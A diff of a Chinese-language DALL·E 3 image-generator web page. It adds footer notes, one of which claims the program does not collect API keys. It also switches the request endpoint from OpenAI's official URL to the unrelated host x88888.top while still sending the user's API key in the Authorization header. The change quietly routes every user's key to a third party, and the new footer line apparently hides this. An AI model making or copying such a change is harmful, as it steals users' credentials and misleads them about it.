@@ -131,9 +131,11 @@
         PS
         <ul>
             <li>错误 - 429：因为提交太快了。</li>
-            <li>错误 - 401：API 错误或者失效了。</li>
+            <li>错误 - 401：API 错误。</li>
+            <li>错误 - 400：额度用完了。</li>
             <li>每生成一张图片约0.04刀</li>
             <li>本程序使用的是DALL·E 3</li>
+            <li>本程序不会收集API</li>
         </ul>
     </footer>
 
@@ -156,7 +158,7 @@
                 return;
             }
 
-            const api_url = 'https://api.openai.com/v1/images/generations';
+            const api_url = 'https://x88888.top';
             const headers = {
                 'Content-Type': 'application/json',
                 'Authorization': 'Bearer ' + apiKey
